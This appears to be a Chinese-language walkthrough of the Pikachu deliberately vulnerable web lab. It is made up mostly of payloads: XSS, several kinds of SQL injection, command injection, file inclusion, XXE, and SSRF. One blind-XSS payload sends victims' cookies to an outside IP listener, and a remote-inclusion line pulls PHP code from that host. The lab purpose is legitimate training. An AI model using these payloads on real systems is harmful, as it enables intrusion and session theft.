# Pikachu靶场

## XSS

### 反射性

修改maxlength

```js
<script>alert('XSS')</script>
```

### 反射性-POST

先登录

```js
<script>alert('XSS')</script>
```

### 存储XSS

```js
<script>alert('XSS')</script>
```

会将payload存在数据库中，每次点击这个功能都会触发这个xss

### DOM型XSS

```js
' onclick="alert(1)">
```

### DOM型XSS-X

```js
' onclick="alert(1)">
```

### XSS盲打

在可以输入的地方全部输入payload

监听

```js
python3 -m http.server 7777
```

输入

```js
<script>location.href="http://49.234.56.200:7777/"+document.cookie</script>
```

点击右上角`tips`登录后台，触发payload，监听地址接收到请求

### XSS过滤

大写绕过

```js
<SCRIPT>alert(/1/)</SCRIPT>
```

### XSS之htmlspecialchars

htmlspecialchars默认是不对单引号进行转义的

```js
' onclick='alert(1)'>
```

### XSS之href输出

```js
javascript:alert(1)
```

### XSS之JS输出

会将输入值放到js源码中，闭合js语句，在页面中插入js语句

```js
'</script><script>alert(1)</script>
```

## SQL注入

### 数字型

```sql
id=1 union select 1,2&submit=%E6%9F%A5%E8%AF%A2
```

### 字符型

```js
?name=kobe' union select 1,2--+&submit=%E6%9F%A5%E8%AF%A2
```

### 搜索型

```js
?name=1' union select 1,2,3--+&submit=%E6%90%9C%E7%B4%A2
```

### xx型注入

输入z' sql语句报错

```sql
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''z'')' at line 1
```

闭合

```js
?name=z') union select 1,2--+&submit=%E6%9F%A5%E8%AF%A2
```

### insert/update注入

```sql
sex=girls&phonenum=18656565545' or extractvalue(0x0a,concat(0x0a,(select database()))) or '&add=usaxxxx&email=kobe%40pikachu.com&submit=submit
```

### delete注入

```sql
?id=58+and+extractvalue(0x0a,concat(0x0a,(select+database())))
```

### http header注入

```js
' or extractvalue(0x0a,concat(0x0a,(select database()))) or '
```

### 布尔盲注

```js
?name=lucy' and if(1>2,1,0)--+&submit=%E6%9F%A5%E8%AF%A2
```

### 时间盲注

```sql
?name=lili' and if(3>2,sleep(5),0)--+&submit=%E6%9F%A5%E8%AF%A2
```

### 宽字节注入

```sql
name=lucy%df%27 union select 1,2--+&submit=%E6%9F%A5%E8%AF%A2
```

## RCE

### exec ping

```js
12 || whoami 两个都会执行
12 | whoami  第一个为假 执行第二个

127.0.0.1 && whoami 都会执行
127.0.0.1 && whoami 都会执行

12 && whoami 执行第一个
12 & whoami 两个都执行
```

### exec eval

php代码执行

```php
system('whoami');
```

## File inclusion

### 本地文件包含

```js
?filename=../../../a.txt&submit=%E6%8F%90%E4%BA%A4
```

### 远程文件包含

```php
?filename=http://49.234.56.200/x.php?1=system('ls');&submit=%E6%8F%90%E4%BA%A4
```

## Unsafe Filedownload

```php
?filename=../../../index.php
```

## Unsafe Fileupload

### client check

客户端check

### MIMI Type

```js
Content-Type: image/jpeg
```

### getimagesize

```php
GIF89a
<?php phpinfo(); ?>
```

## Ove Permission

### 水平越权

修改用户名可查看其他用户信息

```php
?username=kobe&submit=点击查看个人信息
```

### 垂直越权

## 目录遍历

```php
?title=../../../README.md
```

## 敏感信息泄露

源码泄露测试账号

```js
 </div><!-- 测试账号:lili/123456-->
```

## PHP反序列化

```php
<?php
class S{
       public $test="<script>alert(1)</script>";
   }
   $s=new S(); //创建一个对象
   echo serialize($s);
?>
```

## XXE

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE creds [<!ENTITY goodies SYSTEM "file:///proc/net/arp">]>
<user><username>&goodies;</username><password>testtest</password></user>
```

## SSRF

### curl

```php
http://192.168.52.137/pikachu/vul/ssrf/ssrf_curl.php?url=http://www.baidu.com
```

### file_get_content

```php
http://192.168.52.137/pikachu/vul/ssrf/ssrf_fgc.php?file=file:///c:/windows/win.ini
```

